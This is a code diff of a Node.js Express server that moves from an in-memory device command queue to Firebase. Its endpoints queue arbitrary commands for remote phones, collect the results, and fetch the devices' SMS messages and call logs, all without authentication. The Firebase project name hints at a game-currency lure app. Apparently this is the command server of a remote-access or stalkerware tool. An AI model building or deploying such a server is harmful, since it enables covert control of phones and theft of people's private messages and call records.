@@ -1,187 +1,187 @@
 const express = require('express');
+const admin = require('firebase-admin');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Middleware
+// Initialize Firebase Admin
+const serviceAccount = require('./serviceAccountKey.json'); // Make sure this file exists
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // Replace with your DB URL
+});
+
+const db = admin.database();
 app.use(express.json());
 
-// ================== Data Structures ==================
-// In-memory storage (for demo; use Redis/DB in production)
-let commandQueue = {};        // { deviceId: [commands] }
-let deviceStatus = {};        // { deviceId: { lastSeen: timestamp, online: boolean } }
-let commandResults = {};      // { deviceId: [ {command, result, timestamp} ] } (optional)
+// Store for polling results (in-memory, can use Redis in production)
+let resultStore = {};
 
-// ================== Helper Functions ==================
-function updateDeviceSeen(deviceId) {
-    deviceStatus[deviceId] = {
-        lastSeen: Date.now(),
-        online: true
-    };
-}
+// ================== API for Termux ==================
 
-// Clean up offline devices (optional)
-setInterval(() => {
-    const now = Date.now();
-    for (let deviceId in deviceStatus) {
-        if (now - deviceStatus[deviceId].lastSeen > 60000) { // 1 minute offline
-            deviceStatus[deviceId].online = false;
-        }
-    }
-}, 30000);
+// Send command to device
+app.post('/api/command', async (req, res) => {
+  const { deviceId, command } = req.body;
+  if (!deviceId || !command) {
+    return res.status(400).json({ error: 'deviceId and command required' });
+  }
 
-// ================== API Endpoints ==================
+  try {
+    // Push command to Firebase under device's commands
+    const commandsRef = db.ref(`commands/${deviceId}`);
+    const newCommandRef = await commandsRef.push({
+      command,
+      timestamp: admin.database.ServerValue.TIMESTAMP,
+      status: 'pending'
+    });
+    console.log(`Command queued for ${deviceId}: ${command}`);
 
-/**
- * @route POST /api/command
- * @desc  Android app sends command to a specific device
- *        Body: { "deviceId": "phone1", "command": "wifi on" }
- */
-app.post('/api/command', (req, res) => {
-    const { deviceId, command } = req.body;
-    if (!deviceId || !command) {
-        return res.status(400).json({ error: 'deviceId and command required' });
-    }
+    // Also store in resultStore for polling (optional)
+    resultStore[`${deviceId}_lastCommand`] = command;
 
-    if (!commandQueue[deviceId]) {
-        commandQueue[deviceId] = [];
-    }
-    commandQueue[deviceId].push(command);
-    console.log(`[SERVER] Command queued for ${deviceId}: ${command}`);
-
-    // Immediately try to notify any waiting poll (long polling already handled)
-    res.json({ status: 'queued', deviceId, command });
+    res.json({ status: 'queued', deviceId, command, firebaseKey: newCommandRef.key });
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ error: error.message });
+  }
 });
 
-/**
- * @route GET /api/poll/:deviceId
- * @desc  Termux client long polls for commands. Waits up to 30 seconds.
- */
+// Poll for command result (Termux long polling)
 app.get('/api/poll/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const timeout = 30000; // 30 seconds
+  const deviceId = req.params.deviceId;
+  const timeout = 30000; // 30 seconds
 
-    // Update device seen timestamp
-    updateDeviceSeen(deviceId);
+  // Check if there's a result already (from Firebase listener)
+  if (resultStore[deviceId]) {
+    const result = resultStore[deviceId];
+    delete resultStore[deviceId];
+    return res.json({ result });
+  }
 
-    if (!commandQueue[deviceId]) {
-        commandQueue[deviceId] = [];
+  // Otherwise wait for result via Firebase listener
+  const resultRef = db.ref(`results/${deviceId}`).limitToLast(1);
+  let responded = false;
+
+  const listener = resultRef.on('child_added', (snapshot) => {
+    if (!responded) {
+      responded = true;
+      clearTimeout(timer);
+      resultRef.off('child_added', listener);
+      const result = snapshot.val();
+      res.json({ result });
     }
+  });
 
-    // If command already waiting, return immediately
-    if (commandQueue[deviceId].length > 0) {
-        const command = commandQueue[deviceId].shift();
-        console.log(`[SERVER] Immediate command for ${deviceId}: ${command}`);
-        return res.json({ command });
+  const timer = setTimeout(() => {
+    if (!responded) {
+      responded = true;
+      resultRef.off('child_added', listener);
+      res.json({ result: null }); // No result within timeout
     }
+  }, timeout);
 
-    // Otherwise, wait for a command to arrive
+  req.on('close', () => {
+    clearTimeout(timer);
+    resultRef.off('child_added', listener);
+  });
+});
+
+// ================== API for App to post results ==================
+// (App will write directly to Firebase, but we can also accept HTTP if needed)
+app.post('/api/result', (req, res) => {
+  const { deviceId, command, result, error } = req.body;
+  // Store in memory for polling
+  resultStore[deviceId] = { command, result, error, timestamp: Date.now() };
+  res.sendStatus(200);
+});
+
+// ================== SMS & Call Logs Endpoints ==================
+
+// Request SMS list from device
+app.get('/api/sms/:deviceId', async (req, res) => {
+  const deviceId = req.params.deviceId;
+  const requestId = Date.now().toString();
+
+  try {
+    // Write request to Firebase
+    await db.ref(`requests/${deviceId}/sms`).set({
+      requestId,
+      timestamp: admin.database.ServerValue.TIMESTAMP
+    });
+
+    // Wait for response (poll Firebase)
+    const responseRef = db.ref(`responses/${deviceId}/sms`);
+    const timeout = 10000; // 10 seconds
     let responded = false;
-    const timer = setTimeout(() => {
-        if (!responded) {
-            responded = true;
-            res.json({ command: null }); // no command, just keep polling
+
+    const listener = responseRef.on('value', (snapshot) => {
+      if (!responded && snapshot.exists()) {
+        const data = snapshot.val();
+        if (data.requestId === requestId) {
+          responded = true;
+          clearTimeout(timer);
+          responseRef.off('value', listener);
+          // Delete after reading? Optional
+          responseRef.remove();
+          res.json(data.smsList || []);
         }
+      }
+    });
+
+    const timer = setTimeout(() => {
+      if (!responded) {
+        responded = true;
+        responseRef.off('value', listener);
+        res.status(408).json({ error: 'Timeout waiting for SMS' });
+      }
     }, timeout);
 
-    // Polling mechanism: check every second for new commands
-    const interval = setInterval(() => {
-        if (responded) return;
-        if (commandQueue[deviceId].length > 0) {
-            clearInterval(interval);
-            clearTimeout(timer);
-            responded = true;
-            const command = commandQueue[deviceId].shift();
-            console.log(`[SERVER] Delayed command for ${deviceId}: ${command}`);
-            res.json({ command });
-        }
-    }, 1000);
-
-    // Cleanup on client disconnect
-    req.on('close', () => {
-        clearInterval(interval);
-        clearTimeout(timer);
-    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
 });
 
-/**
- * @route POST /api/result
- * @desc  Termux client reports command execution result
- *        Body: { "deviceId": "phone1", "command": "wifi on", "result": "success", "error": null }
- */
-app.post('/api/result', (req, res) => {
-    const { deviceId, command, result, error } = req.body;
-    console.log(`[SERVER] Result from ${deviceId} for command "${command}":`, result || error);
+// Similarly for call logs
+app.get('/api/calls/:deviceId', async (req, res) => {
+  const deviceId = req.params.deviceId;
+  const requestId = Date.now().toString();
 
-    // Store result for history (optional)
-    if (!commandResults[deviceId]) commandResults[deviceId] = [];
-    commandResults[deviceId].push({
-        command,
-        result: result || error,
-        timestamp: Date.now()
+  try {
+    await db.ref(`requests/${deviceId}/calls`).set({
+      requestId,
+      timestamp: admin.database.ServerValue.TIMESTAMP
     });
 
-    res.sendStatus(200);
-});
+    const responseRef = db.ref(`responses/${deviceId}/calls`);
+    const timeout = 10000;
+    let responded = false;
 
-/**
- * @route POST /api/register
- * @desc  Termux client sends heartbeat to register/update its presence
- *        Body: { "deviceId": "phone1", "info": { "model": "xyz", "battery": 80 } }
- */
-app.post('/api/register', (req, res) => {
-    const { deviceId, info } = req.body;
-    if (!deviceId) {
-        return res.status(400).json({ error: 'deviceId required' });
-    }
-    updateDeviceSeen(deviceId);
-    // Optionally store additional device info
-    if (!deviceStatus[deviceId]) deviceStatus[deviceId] = {};
-    deviceStatus[deviceId].info = info || {};
-    console.log(`[SERVER] Device registered: ${deviceId}`);
-    res.json({ status: 'registered', deviceId });
-});
-
-/**
- * @route GET /api/devices
- * @desc  Android app fetches list of online devices
- */
-app.get('/api/devices', (req, res) => {
-    const onlineDevices = [];
-    for (let deviceId in deviceStatus) {
-        if (deviceStatus[deviceId].online) {
-            onlineDevices.push({
-                deviceId,
-                lastSeen: deviceStatus[deviceId].lastSeen,
-                info: deviceStatus[deviceId].info || {}
-            });
+    const listener = responseRef.on('value', (snapshot) => {
+      if (!responded && snapshot.exists()) {
+        const data = snapshot.val();
+        if (data.requestId === requestId) {
+          responded = true;
+          clearTimeout(timer);
+          responseRef.off('value', listener);
+          responseRef.remove();
+          res.json(data.callList || []);
         }
-    }
-    res.json(onlineDevices);
+      }
+    });
+
+    const timer = setTimeout(() => {
+      if (!responded) {
+        responded = true;
+        responseRef.off('value', listener);
+        res.status(408).json({ error: 'Timeout waiting for call logs' });
+      }
+    }, timeout);
+
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
 });
 
-/**
- * @route GET /api/status/:deviceId
- * @desc  Get status of a specific device
- */
-app.get('/api/status/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const status = deviceStatus[deviceId] || { online: false, lastSeen: null };
-    res.json({ deviceId, ...status });
-});
+// Root
+app.get('/', (req, res) => res.send('Firebase Server Running'));
 
-// Optional: Command history for a device
-app.get('/api/history/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const history = commandResults[deviceId] || [];
-    res.json(history);
-});
-
-// Root endpoint
-app.get('/', (req, res) => {
-    res.send('WiFi Control Server is running. Use /api endpoints.');
-});
-
-// Start server
-app.listen(PORT, () => {
-    console.log(`✅ Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
